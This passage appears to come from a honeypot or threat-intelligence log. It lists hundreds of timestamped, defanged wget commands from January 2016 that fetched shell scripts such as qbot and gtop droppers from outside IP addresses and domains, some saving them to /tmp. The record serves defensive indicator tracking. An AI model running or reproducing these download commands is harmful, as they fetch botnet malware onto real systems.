\/\u003E2016-01-15 19:14:54 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-15 18:26:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 17:31:26 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-15 17:17:24 | wget hxxp:\/\/ www.hongcherng.com\/rd\/rd . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-15 16:43:10 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-15 15:26:25 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-15 14:13:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 14:03:12 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 12:40:26 | wget -q hxxp:\/\/ 162.208.8.203\/p . sh\u003Cbr \/\u003E2016-01-15 07:31:16 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 07:21:29 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-15 07:14:50 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-15 06:44:14 | wget hxxp:\/\/ 216.158.225.7\/gtop . sh\u003Cbr \/\u003E2016-01-15 02:38:27 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-15 02:36:06 | wget -q hxxp:\/\/ 198.12.97.67\/Bot\/stun . sh\u003Cbr \/\u003E2016-01-15 02:22:57 | wget -q hxxp:\/\/ 198.12.97.67\/Bot\/stun . sh\u003Cbr \/\u003E2016-01-15 00:27:16 | wget www.hongcherng.com\/bc\/bc . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-15 00:12:57 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 22:45:16 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 22:03:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 21:53:15 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 21:39:11 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-14 20:55:24 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 20:26:48 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 17:59:24 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-14 17:45:01 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 17:03:32 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 15:24:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 15:14:55 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 15:01:20 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-14 14:45:57 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-14 14:15:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 14:05:54 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-14 13:54:38 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-14 13:43:29 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-14 10:37:24 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-14 10:37:22 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-14 08:54:03 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-14 00:52:25 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-14 00:05:18 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-13 22:22:16 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-13 22:12:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-13 21:44:02 | wget ftx:\/\/79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-13 21:19:52 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-13 21:16:50 | wget www.hongcherng.com\/bc\/bc . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-13 19:46:09 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-13 16:48:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-13 16:38:50 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-13 15:05:41 | wget www.hongcherng.com\/bc\/bc . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-13 14:31:12 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 14:16:54 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-13 14:10:12 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-13 14:09:33 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-13 13:23:35 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 13:23:33 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 13:18:01 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-13 12:40:02 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-13 12:39:59 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-13 10:35:24 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 08:02:52 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 07:21:22 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-13 07:03:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-13 06:05:58 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-13 02:46:30 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-13 02:26:53 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-13 02:11:42 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-13 01:20:37 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-13 01:17:04 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-13 00:35:44 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-13 00:27:29 | wget www.hongcherng.com\/bc\/bc . sh-O \/tmp\/ich . sh\u003Cbr \/\u003E2016-01-12 23:46:54 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-12 21:44:13 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-12 20:25:49 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-12 16:53:10 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-12 16:43:17 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-12 11:30:47 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-12 11:22:14 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-12 08:50:05 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-12 07:53:17 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-12 05:53:28 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-12 04:49:52 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-12 04:40:07 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-12 04:31:34 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-12 03:29:42 | wget hxxp:\/\/ 89.248.166.131\/bin . sh\u003Cbr \/\u003E2016-01-12 02:14:17 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-12 02:14:11 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-12 01:45:01 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-11 23:11:53 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 23:02:44 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 22:36:13 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-11 22:32:27 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 22:32:27 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 21:48:15 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-11 21:25:01 | wget hxxp:\/\/ 173.242.119.122\/lol . sh\u003Cbr \/\u003E2016-01-11 21:21:29 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-11 19:17:44 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-11 18:46:32 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 17:40:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 14:26:05 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-11 14:11:40 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 14:11:40 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 13:59:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 13:54:43 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 13:54:42 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 13:49:10 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 13:44:07 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 13:44:07 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 12:25:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 12:15:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 08:38:34 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 08:28:25 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 08:22:59 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-11 08:22:57 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-11 08:11:02 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 07:32:20 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 06:43:22 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 00:57:03 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 00:49:38 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 00:42:41 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 00:42:41 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 00:34:05 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-11 00:28:19 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 00:28:19 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-11 00:13:57 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-11 00:04:14 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 23:18:31 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-10 23:16:03 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 23:06:26 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 19:55:46 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-10 19:51:09 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-10 19:46:55 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-10 19:23:48 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-10 19:23:10 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 19:23:10 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 19:16:57 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 19:07:02 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 18:48:58 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 18:47:19 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-10 17:35:23 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 17:31:07 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 17:24:01 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 17:09:50 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 17:09:50 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-10 16:42:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 16:32:20 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 15:07:41 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-10 12:18:23 | wget hxxp:\/\/ 218.104.49.211\/r3\/rd . sh-O \/tmp\/ vira . sh\u003Cbr \/\u003E2016-01-10 07:36:02 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-10 05:19:50 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-10 05:18:36 | wget -q hxxp:\/\/ 208.67.1.165\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 04:43:01 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-10 03:24:31 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 03:14:55 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 02:43:30 | wget hxxp:\/\/ 218.104.49.211\/r3\/\/rd . sh-O \/tmp\/.lm . sh\u003Cbr \/\u003E2016-01-10 02:34:43 | wget wget hxxp:\/\/ 218.104.49.211\/r3\/\/rd . sh-O \/tmp\/.lm . sh\u003Cbr \/\u003E2016-01-10 02:15:50 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-10 02:13:48 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 02:04:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 01:48:43 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 01:39:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 01:16:59 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 01:07:17 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 00:42:47 | wget hxxp:\/\/ 218.104.49.211\/r3\/rd . sh-O \/tmp\/ vira . sh\u003Cbr \/\u003E2016-01-10 00:40:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 00:31:26 | wget hxxp:\/\/ 192.227.170.67\/bins . sh\u003Cbr \/\u003E2016-01-10 00:30:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 00:15:46 | wget hxxp:\/\/ 218.104.49.211\/r3\/rd . sh-O \/tmp\/ vira . sh\u003Cbr \/\u003E2016-01-10 00:05:51 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-10 00:05:40 | wget hxxp:\/\/ 218.104.49.211\/r3\/rd . sh-O \/tmp\/ vira . sh\u003Cbr \/\u003E2016-01-10 00:02:25 | wget hxxp:\/\/ 94.102.63.136\/bin . sh\u003Cbr \/\u003E2016-01-09 23:56:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 23:20:55 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-09 22:43:46 | wget hxxp:\/\/ 218.104.49.211\/r3\/rd . sh-O \/tmp\/ vira . sh\u003Cbr \/\u003E2016-01-09 22:26:27 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 22:03:05 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 21:18:34 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:59:54 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:58:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 20:57:46 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:48:49 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 20:48:28 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 20:40:57 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 20:40:57 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 20:24:46 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:24:36 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 20:24:36 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 20:11:20 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 20:08:49 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:07:05 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-09 20:01:36 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 17:16:47 | wget ftx:\/\/51.254.238.19\/gb . sh\u003Cbr \/\u003E2016-01-09 14:22:09 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 14:12:07 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 13:25:54 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 13:15:46 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 09:53:33 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 09:42:53 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-09 09:42:51 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-09 09:35:50 | wget hxxp:\/\/ 158.69.205.212\/getbinaries . sh\u003Cbr \/\u003E2016-01-09 08:27:57 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 07:56:56 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 07:48:27 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-09 06:20:33 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-09 05:49:03 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 05:39:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 05:14:00 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 05:02:32 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 04:52:29 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 04:43:25 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 04:40:06 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 04:30:04 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 04:07:08 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 04:05:31 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 03:44:26 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 03:40:26 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 03:27:09 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 03:27:09 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 03:15:18 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 03:05:34 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 02:57:44 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 02:57:14 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 02:55:39 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 02:44:07 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 01:54:55 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 01:45:07 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 01:23:34 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 01:13:37 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 01:03:32 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 01:02:08 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 00:55:33 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 00:55:33 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 00:51:33 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 00:41:31 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 00:41:29 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 00:41:29 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-09 00:27:11 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-09 00:26:46 | wget hxxp:\/\/ 31.14.136.142\/bins . sh\u003Cbr \/\u003E2016-01-09 00:18:20 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 00:08:27 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-09 00:03:17 | wget hxxp:\/\/ 23.89.158.69\/gtop . sh\u003Cbr \/\u003E2016-01-08 21:51:53 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 21:43:27 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 21:25:29 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 21:24:16 | wget hxxp:\/\/ 31.14.136.142\/bins . sh\u003Cbr \/\u003E2016-01-08 21:15:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 21:00:41 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 20:50:57 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 20:33:48 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 20:25:50 | wget ftx:\/\/51.254.238.19\/gb . sh\u003Cbr \/\u003E2016-01-08 20:24:00 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 19:48:28 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-08 17:43:31 | wget 